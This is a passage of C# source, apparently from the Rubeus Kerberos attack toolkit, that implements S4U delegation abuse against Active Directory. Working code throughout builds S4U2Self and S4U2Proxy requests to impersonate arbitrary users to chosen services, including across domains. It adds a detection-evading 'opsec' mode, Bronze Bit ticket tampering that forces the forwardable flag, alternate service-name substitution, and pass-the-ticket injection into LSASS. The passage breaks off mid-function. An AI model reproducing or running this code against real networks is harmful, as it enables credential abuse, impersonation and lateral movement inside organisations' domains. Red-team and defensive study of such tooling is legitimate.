b'\xef\xbb\xbfusing System;\nusing System.IO;\nusing System.Linq;\nusing System.Net;\nusing System.Collections.Generic;\nusing Asn1;\nusing Rubeus.lib.Interop;\n\n\nnamespace Rubeus\n{\n    public class S4U\n    {\n        public static void Execute(string userName, string domain, string keyString, Interop.KERB_ETYPE etype, string targetUser, string targetSPN = "", string outfile = "", bool ptt = false, string domainController = "", string altService = "", KRB_CRED tgs = null, string targetDomainController = "", string targetDomain = "", bool self = false, bool opsec = false, bool bronzebit = false, bool pac = true)\n        {\n            // first retrieve a TGT for the user\n            byte[] kirbiBytes = Ask.TGT(userName, domain, keyString, etype, null, false, domainController, new LUID(), false, opsec, "", false, pac);\n\n            if (kirbiBytes == null)\n            {\n                Console.WriteLine("[X] Error retrieving a TGT with the supplied parameters");\n                return;\n            }\n            else\n            {\n                Console.WriteLine("\\r\\n");\n            }\n\n            // transform the TGT bytes into a .kirbi file\n            KRB_CRED kirbi = new KRB_CRED(kirbiBytes);\n\n            // execute the s4u process\n            Execute(kirbi, targetUser, targetSPN, outfile, ptt, domainController, altService, tgs, targetDomainController, targetDomain, self, opsec, bronzebit, keyString, etype);\n        }\n        public static void Execute(KRB_CRED kirbi, string targetUser, string targetSPN = "", string outfile = "", bool ptt = false, string domainController = "", string altService = "", KRB_CRED tgs = null, string targetDomainController = "", string targetDomain = "", bool s = false, bool opsec = false, bool bronzebit = false, string keyString = "", Interop.KERB_ETYPE encType = Interop.KERB_ETYPE.subkey_keymaterial, string requestDomain = "", string impersonateDomain = "")\n        {\n            Console.WriteLine("[*] Action: S4U\\r\\n");\n\n            if (!String.IsNullOrEmpty(targetDomain) && !String.IsNullOrEmpty(targetDomainController))\n            {\n                // do cross domain S4U\n                // no support for supplying a TGS due to requiring more than a single ticket\n                Console.WriteLine("[*] Performing cross domain constrained delegation");\n                CrossDomainS4U(kirbi, targetUser, targetSPN, ptt, domainController, altService, targetDomainController, targetDomain);\n            }\n            else\n            {\n                if (tgs != null && String.IsNullOrEmpty(targetSPN) == false)\n                {\n                    Console.WriteLine("[*] Loaded a TGS for {0}\\\\{1}", tgs.enc_part.ticket_info[0].prealm, tgs.enc_part.ticket_info[0].pname.name_string[0]);\n                    S4U2Proxy(kirbi, targetUser, targetSPN, outfile, ptt, domainController, altService, tgs, opsec);\n                }\n                else\n                {\n                    KRB_CRED self = null;\n                    if (!String.IsNullOrEmpty(targetDomain))\n                    {\n                        // Get relevent information from provided referral ticket\n                        string userName = kirbi.enc_part.ticket_info[0].pname.name_string[0];\n                        string domain = targetDomain;\n                        targetDomain = kirbi.enc_part.ticket_info[0].prealm;\n                        Ticket ticket = kirbi.tickets[0];\n                        byte[] clientKey = kirbi.enc_part.ticket_info[0].key.keyvalue;\n                        Interop.KERB_ETYPE etype = (Interop.KERB_ETYPE)kirbi.enc_part.ticket_info[0].key.keytype;\n\n                        // If these domains are empty, use the domain from the referral ticket\n                        if (String.IsNullOrEmpty(impersonateDomain))\n                            impersonateDomain = targetDomain;\n\n                        if (String.IsNullOrEmpty(requestDomain))\n                            requestDomain = targetDomain;\n\n\n                        KRB_CRED localSelf = CrossDomainS4U2Self(string.Format("{0}@{1}", userName, domain), string.Format("{0}@{1}", targetUser, impersonateDomain), domainController, ticket, clientKey, etype, Interop.KERB_ETYPE.subkey_keymaterial, false, altService, s, requestDomain, ptt);\n                    }\n                    else\n                    {\n                        self = S4U2Self(kirbi, targetUser, targetSPN, outfile, ptt, domainController, altService, s, opsec, bronzebit, keyString, encType);\n                        if (self == null)\n                        {\n                            Console.WriteLine("[X] S4U2Self failed, unable to perform S4U2Proxy.");\n                            return;\n                        }\n                    }\n                    if (String.IsNullOrEmpty(targetSPN) == false)\n                    {\n                        S4U2Proxy(kirbi, targetUser, targetSPN, outfile, ptt, domainController, altService, self, opsec);\n                    }\n                }\n            }\n        }\n        private static void S4U2Proxy(KRB_CRED kirbi, string targetUser, string targetSPN, string outfile, bool ptt, string domainController = "", string altService = "", KRB_CRED tgs = null, bool opsec = false)\n        {\n            Console.WriteLine("[*] Impersonating user \'{0}\' to target SPN \'{1}\'", targetUser, targetSPN);\n            if (!String.IsNullOrEmpty(altService))\n            {\n                string[] altSnames = altService.Split(\',\');\n                if (altSnames.Length == 1)\n                {\n                    Console.WriteLine("[*]   Final ticket will be for the alternate service \'{0}\'", altService);\n                }\n                else\n                {\n                    Console.WriteLine("[*]   Final tickets will be for the alternate services \'{0}\'", altService);\n                }\n            }\n\n            // extract out the info needed for the TGS-REQ/S4U2Proxy execution\n            string userName = kirbi.enc_part.ticket_info[0].pname.name_string[0];\n            string domain = kirbi.enc_part.ticket_info[0].prealm;\n            Ticket ticket = kirbi.tickets[0];\n            byte[] clientKey = kirbi.enc_part.ticket_info[0].key.keyvalue;\n            Interop.KERB_ETYPE etype = (Interop.KERB_ETYPE)kirbi.enc_part.ticket_info[0].key.keytype;\n\n            string dcIP = Networking.GetDCIP(domainController);\n            if (String.IsNullOrEmpty(dcIP)) { return; }\n            Console.WriteLine("[*] Building S4U2proxy request for service: \'{0}\'", targetSPN);\n            TGS_REQ s4u2proxyReq = new TGS_REQ(!opsec);\n\n            s4u2proxyReq.req_body.kdcOptions = s4u2proxyReq.req_body.kdcOptions | Interop.KdcOptions.CONSTRAINED_DELEGATION;\n\n            s4u2proxyReq.req_body.realm = domain;\n\n            string[] parts = targetSPN.Split(\'/\');\n            string serverName = parts[parts.Length-1];\n\n            s4u2proxyReq.req_body.sname.name_type = Interop.PRINCIPAL_TYPE.NT_SRV_INST;\n            foreach(string part in parts)\n            {\n                s4u2proxyReq.req_body.sname.name_string.Add(part);\n            }\n\n            // supported encryption types\n            s4u2proxyReq.req_body.etypes.Add(Interop.KERB_ETYPE.aes128_cts_hmac_sha1);\n            s4u2proxyReq.req_body.etypes.Add(Interop.KERB_ETYPE.aes256_cts_hmac_sha1);\n            s4u2proxyReq.req_body.etypes.Add(Interop.KERB_ETYPE.rc4_hmac);\n\n            // add in the ticket from the S4U2self response\n            s4u2proxyReq.req_body.additional_tickets.Add(tgs.tickets[0]);\n\n            // needed for authenticator checksum\n            byte[] cksum_Bytes = null;\n\n            // the rest of the opsec changes\n            if (opsec)\n            {\n                // remove renewableok and add canonicalize\n                s4u2proxyReq.req_body.kdcOptions = s4u2proxyReq.req_body.kdcOptions & ~Interop.KdcOptions.RENEWABLEOK;\n                s4u2proxyReq.req_body.kdcOptions = s4u2proxyReq.req_body.kdcOptions | Interop.KdcOptions.CANONICALIZE;\n\n                // 15 minutes in the future like genuine requests\n                DateTime till = DateTime.Now;\n                till = till.AddMinutes(15);\n                s4u2proxyReq.req_body.till = till;\n\n                // extra etypes\n                s4u2proxyReq.req_body.etypes.Add(Interop.KERB_ETYPE.rc4_hmac_exp);\n                s4u2proxyReq.req_body.etypes.Add(Interop.KERB_ETYPE.old_exp);\n\n                // get hostname and hostname of SPN\n                string hostName = Dns.GetHostName().ToUpper();\n                string targetHostName;\n                if (parts.Length > 1)\n                {\n                    targetHostName = parts[1].Substring(0, parts[1].IndexOf(\'.\')).ToUpper();\n                }\n                else\n                {\n                    targetHostName = hostName;\n                }\n\n                // create enc-authorization-data if target host is not the local machine\n                if (hostName != targetHostName)\n                {\n                    // authdata requires key and etype from tgs\n                    byte[] tgsKey = tgs.enc_part.ticket_info[0].key.keyvalue;\n                    Interop.KERB_ETYPE tgsEtype = (Interop.KERB_ETYPE)tgs.enc_part.ticket_info[0].key.keytype;\n\n                    ADIfRelevant ifrelevant = new ADIfRelevant();\n                    ADRestrictionEntry restrictions = new ADRestrictionEntry();\n                    ADKerbLocal kerbLocal = new ADKerbLocal();\n                    ifrelevant.ADData.Add(restrictions);\n                    ifrelevant.ADData.Add(kerbLocal);\n                    AsnElt authDataSeq = ifrelevant.Encode();\n                    authDataSeq = AsnElt.Make(AsnElt.SEQUENCE, authDataSeq);\n                    byte[] authorizationDataBytes = authDataSeq.Encode();\n                    byte[] enc_authorization_data = Crypto.KerberosEncrypt(tgsEtype, Interop.KRB_KEY_USAGE_TGS_REQ_ENC_AUTHOIRZATION_DATA, tgsKey, authorizationDataBytes);\n                    s4u2proxyReq.req_body.enc_authorization_data = new EncryptedData((Int32)tgsEtype, enc_authorization_data);\n                }\n\n                // encode req_body for authenticator cksum\n                AsnElt req_Body_ASN = s4u2proxyReq.req_body.Encode();\n                AsnElt req_Body_ASNSeq = AsnElt.Make(AsnElt.SEQUENCE, new[] { req_Body_ASN });\n                req_Body_ASNSeq = AsnElt.MakeImplicit(AsnElt.CONTEXT, 4, req_Body_ASNSeq);\n                byte[] req_Body_Bytes = req_Body_ASNSeq.CopyValue();\n                cksum_Bytes = Crypto.KerberosChecksum(clientKey, req_Body_Bytes, Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_RSA_MD5);\n            }\n\n            // moved to end so we can have the checksum in the authenticator\n            PA_DATA padata = new PA_DATA(domain, userName, ticket, clientKey, etype, opsec, cksum_Bytes);\n            s4u2proxyReq.padata.Add(padata);\n            PA_DATA pac_options = new PA_DATA(false, false, false, true);\n            s4u2proxyReq.padata.Add(pac_options);\n\n            byte[] s4ubytes = s4u2proxyReq.Encode().Encode();\n\n            Console.WriteLine("[*] Sending S4U2proxy request");\n            byte[] response2 = Networking.SendBytes(dcIP, 88, s4ubytes);\n            if (response2 == null)\n            {\n                return;\n            }\n\n            // decode the supplied bytes to an AsnElt object\n            //  false == ignore trailing garbage\n            AsnElt responseAsn = AsnElt.Decode(response2, false);\n\n            // check the response value\n            int responseTag = responseAsn.TagValue;\n\n            if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.TGS_REP)\n            {\n                Console.WriteLine("[+] S4U2proxy success!");\n\n                // parse the response to an TGS-REP\n                TGS_REP rep2 = new TGS_REP(responseAsn);\n\n                // https://github.com/gentilkiwi/kekeo/blob/master/modules/asn1/kull_m_kerberos_asn1.h#L62\n                byte[] outBytes2 = Crypto.KerberosDecrypt(etype, 8, clientKey, rep2.enc_part.cipher);\n                AsnElt ae2 = AsnElt.Decode(outBytes2, false);\n                EncKDCRepPart encRepPart2 = new EncKDCRepPart(ae2.Sub[0]);\n\n                if (!String.IsNullOrEmpty(altService))\n                {\n                    string[] altSnames = altService.Split(\',\');\n\n                    foreach (string altSname in altSnames)\n                    {\n                        // now build the final KRB-CRED structure with one or more alternate snames\n                        KRB_CRED cred = new KRB_CRED();\n\n                        // since we want an alternate sname, first substitute it into the ticket structure\n                        rep2.ticket.sname.name_string[0] = altSname;\n\n                        // add the ticket\n                        cred.tickets.Add(rep2.ticket);\n\n                        // build the EncKrbCredPart/KrbCredInfo parts from the ticket and the data in the encRepPart\n\n                        KrbCredInfo info = new KrbCredInfo();\n\n                        // [0] add in the session key\n                        info.key.keytype = encRepPart2.key.keytype;\n                        info.key.keyvalue = encRepPart2.key.keyvalue;\n\n                        // [1] prealm (domain)\n                        info.prealm = encRepPart2.realm;\n\n                        // [2] pname (user)\n                        info.pname.name_type = rep2.cname.name_type;\n                        info.pname.name_string = rep2.cname.name_string;\n\n                        // [3] flags\n                        info.flags = encRepPart2.flags;\n\n                        // [4] authtime (not required)\n\n                        // [5] starttime\n                        info.starttime = encRepPart2.starttime;\n\n                        // [6] endtime\n                        info.endtime = encRepPart2.endtime;\n\n                        // [7] renew-till\n                        info.renew_till = encRepPart2.renew_till;\n\n                        // [8] srealm\n                        info.srealm = encRepPart2.realm;\n\n                        // [9] sname\n                        info.sname.name_type = encRepPart2.sname.name_type;\n                        info.sname.name_string = encRepPart2.sname.name_string;\n\n                        // if we want an alternate sname, substitute it into the encrypted portion of the KRB_CRED\n                        Console.WriteLine("[*] Substituting alternative service name \'{0}\'", altSname);\n                        info.sname.name_string[0] = altSname;\n\n                        // add the ticket_info into the cred object\n                        cred.enc_part.ticket_info.Add(info);\n\n                        byte[] kirbiBytes = cred.Encode().Encode();\n\n                        string kirbiString = Convert.ToBase64String(kirbiBytes);\n\n                        Console.WriteLine("[*] base64(ticket.kirbi) for SPN \'{0}/{1}\':\\r\\n", altSname, serverName);\n\n                        if (false)\n                        {\n                            // display the .kirbi base64, columns of 80 chararacters\n                            foreach (string line in Helpers.Split(kirbiString, 80))\n                            {\n                                Console.WriteLine("      {0}", line);\n                            }\n                        }\n                        else\n                        {\n                            Console.WriteLine("      {0}", kirbiString);\n                        }\n\n                        if (!String.IsNullOrEmpty(outfile))\n                        {\n                            string filename = $"{Helpers.GetBaseFromFilename(outfile)}_{altSname}-{serverName}{Helpers.GetExtensionFromFilename(outfile)}";\n                            filename = Helpers.MakeValidFileName(filename);\n                            if (Helpers.WriteBytesToFile(filename, kirbiBytes))\n                            {\n                                Console.WriteLine("\\r\\n[*] Ticket written to {0}\\r\\n", filename);\n                            }\n                        }\n\n                        if (ptt)\n                        {\n                            // pass-the-ticket -> import into LSASS\n                            LSA.ImportTicket(kirbiBytes, new LUID());\n                        }\n                    }\n                }\n                else\n                {\n                    // now build the final KRB-CRED structure, no alternate snames\n                    KRB_CRED cred = new KRB_CRED();\n\n                    // if we want an alternate sname, first substitute it into the ticket structure\n                    if (!String.IsNullOrEmpty(altService))\n                    {\n                        rep2.ticket.sname.name_string[0] = altService;\n                    }\n\n                    // add the ticket\n                    cred.tickets.Add(rep2.ticket);\n\n                    // build the EncKrbCredPart/KrbCredInfo parts from the ticket and the data in the encRepPart\n\n                    KrbCredInfo info = new KrbCredInfo();\n\n                    // [0] add in the session key\n                    info.key.keytype = encRepPart2.key.keytype;\n                    info.key.keyvalue = encRepPart2.key.keyvalue;\n\n                    // [1] prealm (domain)\n                    info.prealm = encRepPart2.realm;\n\n                    // [2] pname (user)\n                    info.pname.name_type = rep2.cname.name_type;\n                    info.pname.name_string = rep2.cname.name_string;\n\n                    // [3] flags\n                    info.flags = encRepPart2.flags;\n\n                    // [4] authtime (not required)\n\n                    // [5] starttime\n                    info.starttime = encRepPart2.starttime;\n\n                    // [6] endtime\n                    info.endtime = encRepPart2.endtime;\n\n                    // [7] renew-till\n                    info.renew_till = encRepPart2.renew_till;\n\n                    // [8] srealm\n                    info.srealm = encRepPart2.realm;\n\n                    // [9] sname\n                    info.sname.name_type = encRepPart2.sname.name_type;\n                    info.sname.name_string = encRepPart2.sname.name_string;\n\n                    // add the ticket_info into the cred object\n                    cred.enc_part.ticket_info.Add(info);\n\n                    byte[] kirbiBytes = cred.Encode().Encode();\n\n                    string kirbiString = Convert.ToBase64String(kirbiBytes);\n\n                    Console.WriteLine("[*] base64(ticket.kirbi) for SPN \'{0}\':\\r\\n", targetSPN);\n\n                    if (false)\n                    {\n                        // display the .kirbi base64, columns of 80 chararacters\n                        foreach (string line in Helpers.Split(kirbiString, 80))\n                        {\n                            Console.WriteLine("      {0}", line);\n                        }\n                    }\n                    else\n                    {\n                        Console.WriteLine("      {0}", kirbiString);\n                    }\n\n                    if (!String.IsNullOrEmpty(outfile))\n                    {\n                        string filename = $"{Helpers.GetBaseFromFilename(outfile)}_{targetSPN}{Helpers.GetExtensionFromFilename(outfile)}";\n                        filename = Helpers.MakeValidFileName(filename);\n                        if (Helpers.WriteBytesToFile(filename, kirbiBytes))\n                        {\n                            Console.WriteLine("\\r\\n[*] Ticket written to {0}\\r\\n", filename);\n                        }\n                    }\n\n                    if (ptt)\n                    {\n                        // pass-the-ticket -> import into LSASS\n                        LSA.ImportTicket(kirbiBytes, new LUID());\n                    }\n                }\n            }\n            else if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.ERROR)\n            {\n                // parse the response to an KRB-ERROR\n                KRB_ERROR error = new KRB_ERROR(responseAsn.Sub[0]);\n                Console.WriteLine("\\r\\n[X] KRB-ERROR ({0}) : {1}\\r\\n", error.error_code, (Interop.KERBEROS_ERROR)error.error_code);\n            }\n            else\n            {\n                Console.WriteLine("\\r\\n[X] Unknown application tag: {0}", responseTag);\n            }\n        }\n        private static KRB_CRED S4U2Self(KRB_CRED kirbi, string targetUser, string targetSPN, string outfile, bool ptt, string domainController = "", string altService = "", bool self = false, bool opsec = false, bool bronzebit = false, string keyString = "", Interop.KERB_ETYPE encType = Interop.KERB_ETYPE.subkey_keymaterial)\n        {\n            // extract out the info needed for the TGS-REQ/S4U2Self execution\n            string userName = kirbi.enc_part.ticket_info[0].pname.name_string[0];\n            string domain = kirbi.enc_part.ticket_info[0].prealm;\n            Ticket ticket = kirbi.tickets[0];\n            byte[] clientKey = kirbi.enc_part.ticket_info[0].key.keyvalue;\n            Interop.KERB_ETYPE etype = (Interop.KERB_ETYPE)kirbi.enc_part.ticket_info[0].key.keytype;\n\n            string dcIP = Networking.GetDCIP(domainController);\n            if (String.IsNullOrEmpty(dcIP)) { return null; }\n\n            Console.WriteLine("[*] Building S4U2self request for: \'{0}@{1}\'", userName, domain);\n\n            byte[] tgsBytes = TGS_REQ.NewTGSReq(userName, domain, userName, ticket, clientKey, etype, Interop.KERB_ETYPE.subkey_keymaterial, false, targetUser, false, false, opsec);\n\n            Console.WriteLine("[*] Sending S4U2self request");\n            byte[] response = Networking.SendBytes(dcIP, 88, tgsBytes);\n            if (response == null)\n            {\n                return null;\n            }\n\n            // decode the supplied bytes to an AsnElt object\n            //  false == ignore trailing garbage\n            AsnElt responseAsn = AsnElt.Decode(response, false);\n\n            // check the response value\n            int responseTag = responseAsn.TagValue;\n\n            if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.TGS_REP)\n            {\n                Console.WriteLine("[+] S4U2self success!");\n\n                // parse the response to an TGS-REP\n                TGS_REP rep = new TGS_REP(responseAsn);\n                // KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY = 8\n                byte[] outBytes = Crypto.KerberosDecrypt(etype, Interop.KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY, clientKey, rep.enc_part.cipher);\n                AsnElt ae = AsnElt.Decode(outBytes, false);\n                EncKDCRepPart encRepPart = new EncKDCRepPart(ae.Sub[0]);\n\n                // now build the final KRB-CRED structure\n                KRB_CRED cred = new KRB_CRED();\n\n                // if we want to use this s4u2self ticket for authentication, change the sname\n                if (!String.IsNullOrEmpty(altService) && self)\n                {\n                    rep.ticket.sname.name_string[0] = altService.Split(\'/\')[0];\n                    rep.ticket.sname.name_string.Add(altService.Split(\'/\')[1]);\n                }\n\n                // build the EncKrbCredPart/KrbCredInfo parts from the ticket and the data in the encRepPart\n\n                KrbCredInfo info = new KrbCredInfo();\n\n                // [0] add in the session key\n                info.key.keytype = encRepPart.key.keytype;\n                info.key.keyvalue = encRepPart.key.keyvalue;\n\n                // [1] prealm (domain)\n                info.prealm = encRepPart.realm;\n\n                // [2] pname (user)\n                info.pname.name_type = rep.cname.name_type;\n                info.pname.name_string = rep.cname.name_string;\n\n                // [3] flags\n                info.flags = encRepPart.flags;\n                if (bronzebit && !String.IsNullOrEmpty(keyString))\n                {\n                    Console.WriteLine("[*] Bronze Bit flag passed, flipping forwardable flag on. Original flags: {0}", info.flags);\n                    info.flags |= Interop.TicketFlags.forwardable;\n\n                    // get user longterm key from keyString\n                    byte[] key = Helpers.StringToByteArray(keyString);\n\n                    // decrypt and decode ticket encpart\n                    var decTicketPart = rep.ticket.Decrypt(key, null, true);\n\n                    // modify flags\n                    decTicketPart.flags |= Interop.TicketFlags.forwardable;\n\n                    // encode and encrypt ticket encpart\n                    byte[] encTicketData = decTicketPart.Encode().Encode();\n                    byte[] encTicketPart = Crypto.KerberosEncrypt((Interop.KERB_ETYPE)rep.ticket.enc_part.etype, Interop.KRB_KEY_USAGE_AS_REP_TGS_REP, key, encTicketData);\n                    rep.ticket.enc_part = new EncryptedData(rep.ticket.enc_part.etype, encTicketPart, rep.ticket.enc_part.kvno);\n                    Console.WriteLine("[*] Flags changed to: {0}", info.flags);\n                }\n\n                // add the ticket\n                cred.tickets.Add(rep.ticket);\n\n                // [4] authtime (not required)\n\n                // [5] starttime\n                info.starttime = encRepPart.starttime;\n\n                // [6] endtime\n                info.endtime = encRepPart.endtime;\n\n                // [7] renew-till\n                info.renew_till = encRepPart.renew_till;\n\n                // [8] srealm\n                info.srealm = encRepPart.realm;\n\n                // [9] sname\n                info.sname.name_type = encRepPart.sname.name_type;\n                info.sname.name_string = encRepPart.sname.name_string;\n\n                // if we want to use the s4u2self change the sname here too\n                if (!String.IsNullOrEmpty(altService) && self)\n                {\n                    Console.WriteLine("[*] Substituting alternative service name \'{0}\'", altService);\n                    info.sname.name_string[0] = altService.Split(\'/\')[0];\n                    info.sname.name_string.Add(altService.Split(\'/\')[1]);\n                }\n\n                // add the ticket_info into the cred object\n                cred.enc_part.ticket_info.Add(info);\n\n                byte[] kirbiBytes = cred.Encode().Encode();\n\n                string kirbiString = Convert.ToBase64String(kirbiBytes);\n\n                Console.WriteLine("[*] Got a TGS for \'{0}\' to \'{1}@{2}\'", info.pname.name_string[0], info.sname.name_string[0], info.srealm);\n                Console.WriteLine("[*] base64(ticket.kirbi):\\r\\n");\n\n                if (false)\n                {\n                    // display the .kirbi base64, columns of 80 chararacters\n                    foreach (string line in Helpers.Split(kirbiString, 80))\n                    {\n                        Console.WriteLine("      {0}", line);\n                    }\n                }\n                else\n                {\n                    Console.WriteLine("      {0}", kirbiString);\n                }\n\n                Console.WriteLine("");\n\n                if (!String.IsNullOrEmpty(outfile))\n                {\n                    string filename = $"{Helpers.GetBaseFromFilename(outfile)}_{info.pname.name_string[0]}_to_{info.sname.name_string[0]}@{info.srealm}{Helpers.GetExtensionFromFilename(outfile)}";\n                    filename = Helpers.MakeValidFileName(filename);\n                    if (Helpers.WriteBytesToFile(filename, kirbiBytes))\n                    {\n                        Console.WriteLine("\\r\\n[*] Ticket written to {0}\\r\\n", filename);\n                    }\n                }\n\n                if (ptt && self)\n                {\n                    // pass-the-ticket -> import into LSASS\n                    LSA.ImportTicket(kirbiBytes, new LUID());\n                }\n\n                return cred;\n            }\n            else if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.ERROR)\n            {\n                // parse the response to an KRB-ERROR\n                KRB_ERROR error = new KRB_ERROR(responseAsn.Sub[0]);\n                Console.WriteLine("\\r\\n[X] KRB-ERROR ({0}) : {1}\\r\\n", error.error_code, (Interop.KERBEROS_ERROR)error.error_code);\n            }\n            else\n            {\n                Console.WriteLine("\\r\\n[X] Unknown application tag: {0}", responseTag);\n            }\n\n            return null;\n        }\n\n        private static void CrossDomainS4U(KRB_CRED kirbi, string targetUser, string targetSPN, bool ptt, string domainController = "", string altService = "", string targetDomainController = "", string targetDomain = "")\n        {\n            // extract out the info needed for the TGS-REQ/S4U2Self execution\n            string userName = kirbi.enc_part.ticket_info[0].pname.name_string[0];\n            string domain = kirbi.enc_part.ticket_info[0].prealm;\n            Ticket ticket = kirbi.tickets[0];\n            byte[] clientKey = kirbi.enc_part.ticket_info[0].key.keyvalue;\n            Interop.KERB_ETYPE etype = (Interop.KERB_ETYPE)kirbi.enc_part.ticket_info[0].key.keytype;\n\n            // user variables\n            string user = string.Format("{0}@{1}", userName, domain);\n            string target = string.Format("{0}@{1}", targetUser, targetDomain);\n\n            // First retrieve our service ticket for the target domains KRBTGT from our DC\n            Console.WriteLine("[*] Retrieving referral TGT from {0} for foreign domain, {1}, KRBTGT service", domain, targetDomain);\n            byte[] crossBytes = Ask.TGS(userName, domain, ticket, clientKey, etype, string.Format("krbtgt/{0}", targetDomain), Interop.KERB_ETYPE.subkey_keymaterial, "", false, domainController, true);\n            KRB_CRED crossTGS = new KRB_CRED(crossBytes);\n            Interop.KERB_ETYPE crossEtype = (Interop.KERB_ETYPE)crossTGS.enc_part.ticket_info[0].key.keytype;\n            byte[] crossKey = crossTGS.enc_part.ticket_info[0].key.keyvalue;\n\n            // Next retrieve an S4U2Self referral from the target domains DC\n            // to be used when we ask for a S4U2Self from our DC\n            // We need to use our referral TGT for the target domain for this\n            Console.WriteLine("[*] Retrieving the S4U2Self referral from {0}", targetDomain);\n            KRB_CRED foreignSelf = CrossDomainS4U2Self(user, target, targetDomainController, crossTGS.tickets[0], crossKey, crossEtype, Interop.KERB_ETYPE.subkey_keymaterial);\n            crossEtype = (Interop.KERB_ETYPE)foreignSelf.enc_part.ticket_info[0].key.keytype;\n            crossKey = foreignSelf.enc_part.ticket_info[0].key.keyvalue;\n\n            // Now retrieve the S4U2Self ticket from our DC\n            // We use the S4U2Self referral to ask for this\n            Console.WriteLine("[*] Requesting the S4U2Self ticket from {0}", domain);\n            KRB_CRED localSelf = CrossDomainS4U2Self(user, target, domainController, foreignSelf.tickets[0], crossKey, crossEtype, Interop.KERB_ETYPE.subkey_keymaterial, false);\n\n            if (!String.IsNullOrEmpty(targetSPN))\n            {\n\n                // Using our standard TGT and attaching our local S4U2Self\n                // retrieve an S4U2Proxy from our DC\n                // This will be needed for the last request\n                KRB_CRED localS4U2Proxy = CrossDomainS4U2Proxy(user, target, targetSPN, domainController, ticket, clientKey, etype, Interop.KERB_ETYPE.subkey_keymaterial, localSelf.tickets[0], false);\n                crossEtype = (Interop.KERB_ETYPE)crossTGS.enc_part.ticket_info[0].key.keytype;\n                crossKey = crossTGS.enc_part.ticket_info[0].key.keyvalue;\n\n                // Lastly retrieve the final S4U2Proxy from the foreign domains DC\n                // This is the service ticket we need to access the target service\n                KRB_CRED foreignS4U2Proxy = CrossDomainS4U2Proxy(user, target, targetSPN, targetDomainController, crossTGS.tickets[0], crossKey, crossEtype, Interop.KERB_ETYPE.subkey_keymaterial, localS4U2Proxy.tickets[0], true, ptt);\n            }\n        }\n\n        // to perform the 2 S4U2Self requests\n        private static KRB_CRED CrossDomainS4U2Self(string userName, string targetUser, string targetDomainController, Ticket ticket, byte[] clientKey, Interop.KERB_ETYPE etype, Interop.KERB_ETYPE requestEType, bool cross = true, string altService = "", bool self = false, string requestDomain = "", bool ptt = false)\n        {\n            // die if can\'t get IP of DC\n            string dcIP = Networking.GetDCIP(targetDomainController);\n            if (String.IsNullOrEmpty(dcIP)) { return null; }\n\n            Console.WriteLine("[*] Requesting the cross realm \'S4U2Self\' for {0} from {1}", targetUser, targetDomainController);\n            byte[] tgsBytes = TGS_REQ.NewTGSReq(userName, targetUser, ticket, clientKey, etype, requestEType, cross, requestDomain);\n\n            Console.WriteLine("[*] Sending cross realm S4U2Self request");\n            byte[] response = Networking.SendBytes(dcIP, 88, tgsBytes);\n            if (response == null)\n            {\n                return null;\n            }\n\n            // decode the supplied bytes to an AsnElt object\n            //  false == ignore trailing garbage\n            AsnElt responseAsn = AsnElt.Decode(response, false);\n\n            // check the response value\n            int responseTag = responseAsn.TagValue;\n\n            if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.TGS_REP)\n            {\n                Console.WriteLine("[+] cross realm S4U2Self success!");\n\n                // parse the response to an TGS-REP\n                TGS_REP rep = new TGS_REP(responseAsn);\n                // KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY = 8\n                byte[] outBytes = Crypto.KerberosDecrypt(etype, Interop.KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY, clientKey, rep.enc_part.cipher);\n                AsnElt ae = AsnElt.Decode(outBytes, false);\n                EncKDCRepPart encRepPart = new EncKDCRepPart(ae.Sub[0]);\n\n                // now build the final KRB-CRED structure\n                KRB_CRED cred = new KRB_CRED();\n\n                // if we want to use this s4u2self ticket for authentication, change the sname\n                if (!String.IsNullOrEmpty(altService) && self)\n                {\n                    rep.ticket.sname.name_type = Interop.PRINCIPAL_TYPE.NT_SRV_INST;\n                    rep.ticket.sname.name_string[0] = altService.Split(\'/\')[0];\n                    rep.ticket.sname.name_string.Add(altService.Split(\'/\')[1]);\n                }\n\n                // add the ticket\n                cred.tickets.Add(rep.ticket);\n\n                // build the EncKrbCredPart/KrbCredInfo parts from the ticket and the data in the encRepPart\n\n                KrbCredInfo info = new KrbCredInfo();\n\n                // [0] add in the session key\n                info.key.keytype = encRepPart.key.keytype;\n                info.key.keyvalue = encRepPart.key.keyvalue;\n\n                // [1] prealm (domain)\n                info.prealm = encRepPart.realm;\n\n                // [2] pname (user)\n                info.pname.name_type = rep.cname.name_type;\n                info.pname.name_string = rep.cname.name_string;\n\n                // [3] flags\n                info.flags = encRepPart.flags;\n\n                // [4] authtime (not required)\n\n                // [5] starttime\n                info.starttime = encRepPart.starttime;\n\n                // [6] endtime\n                info.endtime = encRepPart.endtime;\n\n                // [7] renew-till\n                info.renew_till = encRepPart.renew_till;\n\n                // [8] srealm\n                info.srealm = encRepPart.realm;\n\n                // [9] sname\n                info.sname.name_type = encRepPart.sname.name_type;\n                info.sname.name_string = encRepPart.sname.name_string;\n                // if we\'re rewriting the S4U2Self sname, change it here too\n                if (!String.IsNullOrEmpty(altService) && self)\n                {\n                    Console.WriteLine("[*] Substituting alternative service name \'{0}\'", altService);\n                    info.sname.name_type = Interop.PRINCIPAL_TYPE.NT_SRV_INST;\n                    info.sname.name_string[0] = altService.Split(\'/\')[0];\n                    info.sname.name_string.Add(altService.Split(\'/\')[1]);\n                }\n\n                // add the ticket_info into the cred object\n                cred.enc_part.ticket_info.Add(info);\n\n                byte[] kirbiBytes = cred.Encode().Encode();\n\n                PrintTicket(kirbiBytes, "base64(ticket.kirbi)");\n\n                KRB_CRED kirbi = new KRB_CRED(kirbiBytes);\n\n                if (ptt)\n                {\n                    // pass-the-ticket -> import into LSASS\n                    LSA.ImportTicket(kirbiBytes, new LUID());\n                }\n\n                return kirbi;\n            }\n            else if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.ERROR)\n            {\n                // parse the response to an KRB-ERROR\n                KRB_ERROR error = new KRB_ERROR(responseAsn.Sub[0]);\n                Console.WriteLine("\\r\\n[X] KRB-ERROR ({0}) : {1}\\r\\n", error.error_code, (Interop.KERBEROS_ERROR)error.error_code);\n            }\n            else\n            {\n                Console.WriteLine("\\r\\n[X] Unknown application tag: {0}", 